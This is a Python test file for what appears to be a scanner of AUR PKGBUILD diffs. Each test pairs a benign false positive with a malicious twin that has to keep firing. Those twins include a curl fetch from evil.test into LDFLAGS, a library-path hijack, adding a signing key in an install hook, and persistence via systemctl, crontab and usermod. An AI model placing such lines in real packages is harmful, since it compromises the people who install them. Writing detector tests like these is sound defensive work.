"""False positives from the 2026-11-02 watcher review.

Each case pins the benign shape that fired at HEAD 7c206132 and the
true-positive twin the fix must keep.  The batch came from the Electron
launcher (X002, X024), the Go build (X024), an AUR keyring package (X013,
H100), a Python check script (X014), and vendor release hosts
(SOURCE_BUCKET).
"""

from __future__ import annotations

import difflib
import sys
from pathlib import Path

_ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(_ROOT / "scripts"))

from calibration_gates import shipped_config  # noqa: E402

from trustsight.analysis import scan_diff  # noqa: E402
from trustsight.config import load_config, load_rules  # noqa: E402

_BASE = ("pkgname=p", "pkgver=1", "pkgrel=1")


def _diff(lines, *, fn="build", old=_BASE):
    new = list(old) + [f"{fn}() {{", *lines, "}"]
    return "".join(difflib.unified_diff(
        [f"{line}\n" for line in old],
        [f"{line}\n" for line in new],
        "a/PKGBUILD", "b/PKGBUILD", n=3,
    )), "\n".join(new) + "\n"


def _ids(lines, *, fn="build", current_text=None):
    diff, new = _diff(lines, fn=fn)
    with shipped_config():
        fact = scan_diff(
            diff, rules=load_rules(), config=load_config(),
            package_name="p", current_text=current_text or new,
        )
    return {e.rule_id for e in fact.score_breakdown}


def _ids_diff(diff, current_text=None):
    with shipped_config():
        fact = scan_diff(
            diff, rules=load_rules(), config=load_config(),
            package_name="p", current_text=current_text,
        )
    return {e.rule_id for e in fact.score_breakdown}


# X002 - an array element is data, not a command word.

_ARRAY_DIFF = (
    "--- a/PKGBUILD\n+++ b/PKGBUILD\n"
    "@@ -1,7 +1,8 @@\n"
    " pkgname=p\n pkgver=1\n pkgrel=1\n source=(\n"
    '     "a.tar.gz::https://example.test/a.tar.gz"\n'
    '+    "${pkgname}-${pkgver}.js"\n'
    '     "${pkgname}.sh"\n'
    " )\n"
)


def test_x002_source_array_element_is_quiet():
    assert "X002" not in _ids_diff(_ARRAY_DIFF)


def test_x002_array_opener_in_the_hunk_header_is_quiet():
    # git puts the array opener in the hunk header when the hunk starts
    # inside the array, so the continuation lines have no context line of
    # their own to inherit the array state from.
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n"
        "@@ -26,5 +26,6 @@ source=(\n"
        '     "a.tar.gz::https://example.test/a.tar.gz"\n'
        '+    "${pkgname}-${pkgver}.js"\n'
        '     "${pkgname}.sh"\n'
        " )\n"
    )
    assert "X002" not in _ids_diff(diff)


def test_x002_a_real_non_literal_exec_still_fires():
    assert "X002" in _ids(['  "$RUNNER" --flag'])


# X024 - a flag is not an assignment, and a launcher's loader path is local.

def test_x024_a_go_ldflags_flag_is_quiet():
    assert "X024" not in _ids(['  go build -ldflags="${_flags[*]}" .'])


def test_x024_a_real_ldflags_assignment_still_fires():
    assert "X024" in _ids(['  export LDFLAGS="$(curl -s https://evil.test/x)"'])


def test_x024_a_trusted_loader_path_append_is_quiet():
    assert "X024" not in _ids([
        '  _APPDIR="/usr/lib/p"',
        '  export LD_LIBRARY_PATH="${_APPDIR}/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"',
    ])


def test_x024_an_undefined_loader_path_variable_still_fires():
    assert "X024" in _ids(['  export LD_LIBRARY_PATH="${EVIL}:$LD_LIBRARY_PATH"'])


# X013 - populating the package's own keyring is not replacing the trust root.

_KEYRING_DIFF = (
    "--- /dev/null\n+++ b/PKGBUILD\n@@ -0,0 +1,3 @@\n"
    "+pkgname=p\n+pkgver=1\n+install=p.install\n"
    "+source=(\"p.gpg\")\n+sha256sums=(\"0\" * 64)\n"
    "--- /dev/null\n+++ b/p.install\n@@ -0,0 +1,3 @@\n"
    "+post_install() {\n"
    "+  pacman-key --populate p\n"
    "+}\n"
)


def test_x013_populating_a_shipped_keyring_is_quiet():
    assert "X013" not in _ids_diff(_KEYRING_DIFF)


def test_x013_adding_a_key_still_fires():
    diff = (
        "--- /dev/null\n+++ b/PKGBUILD\n@@ -0,0 +1,3 @@\n"
        "+pkgname=p\n+pkgver=1\n+install=p.install\n"
        "--- /dev/null\n+++ b/p.install\n@@ -0,0 +1,3 @@\n"
        "+post_install() {\n"
        "+  pacman-key --recv-keys 0123456789ABCDEF\n"
        "+}\n"
    )
    assert "X013" in _ids_diff(diff)


# X014 - a path-qualified interpreter is an ordinary invocation.

def test_x014_a_path_qualified_python_invocation_is_quiet():
    assert "X014" not in _ids([
        '  "$srcdir/check-env/bin/python" -I "$srcdir/check-static-assets.py"',
    ])


def test_x014_a_flag_carrying_a_build_script_still_fires():
    assert "X014" in _ids(['  mytool --callback "$srcdir/hook.sh"'])


# SOURCE_BUCKET - a vendor's own release host is not an unknown bucket.

def _source_ids(source_url, *, url="https://example.test"):
    current = (
        'pkgname=p\nurl="' + url + '"\n'
        'source=("' + source_url + '")\nsha256sums=("' + "a" * 64 + '")\n'
    )
    diff = "".join(difflib.unified_diff(
        [], [f"{line}\n" for line in current.splitlines()],
        "a/PKGBUILD", "b/PKGBUILD", n=3,
    ))
    return _ids_diff(diff, current_text=current)


def test_source_bucket_a_vendor_cdn_is_quiet():
    assert "SOURCE_BUCKET" not in _source_ids(
        "https://stable.dl2.discordapp.net/distro/app/stable/x/full.distro",
        url="https://discord.com",
    )


def test_source_bucket_a_project_release_host_is_quiet():
    assert "SOURCE_BUCKET" not in _source_ids(
        "https://automation.izoone.com/releases/p/v1/p.tar.gz",
        url="https://automation.izoone.com/releases/p",
    )


def test_source_bucket_an_unknown_host_still_fires():
    assert "SOURCE_BUCKET" in _source_ids("https://evil.test/p.tar.gz")


# H100 - a first submission has no prior hook to appear or retarget.

_NEW_HOOK_DIFF = (
    "--- /dev/null\n+++ b/PKGBUILD\n@@ -0,0 +1,4 @@\n"
    "+pkgname=p\n+pkgver=1\n+pkgrel=1\n+install=p.install\n"
    "--- /dev/null\n+++ b/p.install\n@@ -0,0 +1,3 @@\n"
    "+post_install() {\n"
    "+  systemctl enable --now p\n"
    "+}\n"
)


def test_h100_a_first_submission_hook_is_quiet():
    assert "H100" not in _ids_diff(_NEW_HOOK_DIFF)


def test_h100_a_hook_added_to_an_existing_recipe_still_fires():
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n"
        " pkgname=p\n pkgver=1\n pkgrel=1\n"
        "+install=p.install\n"
        "--- /dev/null\n+++ b/p.install\n@@ -0,0 +1,3 @@\n"
        "+post_install() {\n"
        "+  systemctl enable --now p\n"
        "+}\n"
    )
    assert "H100" in _ids_diff(diff)


# H108 - a printed notice and a relative path are not service enables.

_HOOK_HEAD = (
    "--- /dev/null\n+++ b/PKGBUILD\n@@ -0,0 +1,3 @@\n"
    "+pkgname=p\n+pkgver=1\n+install=p.install\n"
    "--- /dev/null\n+++ b/p.install\n@@ -0,0 +1,5 @@\n"
)


def test_h108_a_printed_notice_is_quiet():
    assert "H108" not in _ids_diff(
        _HOOK_HEAD
        + "+post_install() {\n"
        + "+  cat <<'EOF'\n"
        + "+  you have run wxlauncher at least once, and then:\n"
        + "+EOF\n"
        + "+}\n"
    )


def test_h108_a_real_systemctl_enable_still_fires():
    assert "H108" in _ids_diff(
        _HOOK_HEAD
        + "+post_install() {\n"
        + "+  systemctl enable --now p\n"
        + "+}\n"
    )


def test_h108_a_relative_path_is_not_a_crontab():
    assert "H108" not in _ids_diff(
        _HOOK_HEAD
        + "+post_remove() {\n"
        + "+  rm -f /etc/sudoers.d/dokku-crontab\n"
        + "+}\n"
    )


def test_h108_a_crontab_command_still_fires():
    assert "H108" in _ids_diff(
        _HOOK_HEAD
        + "+post_install() {\n"
        + "+  crontab -e\n"
        + "+}\n"
    )


# H017 - probing for visudo is not privileged setup.

_HOOK_HEAD_4 = (
    "--- /dev/null\n+++ b/PKGBUILD\n@@ -0,0 +1,3 @@\n"
    "+pkgname=p\n+pkgver=1\n+install=p.install\n"
    "--- /dev/null\n+++ b/p.install\n@@ -0,0 +1,4 @@\n"
)


def test_h017_a_visudo_probe_is_quiet():
    assert "H017" not in _ids_diff(
        _HOOK_HEAD_4
        + "+post_install() {\n"
        + "+  if command -v visudo > /dev/null 2>&1; then\n"
        + "+    visudo -cf /etc/sudoers.d/p\n"
        + "+  fi\n"
        + "+}\n"
    )


def test_h017_a_real_account_change_still_fires():
    assert "H017" in _ids_diff(
        _HOOK_HEAD_4
        + "+post_install() {\n"
        + "+  usermod -aG docker p\n"
        + "+}\n"
    )
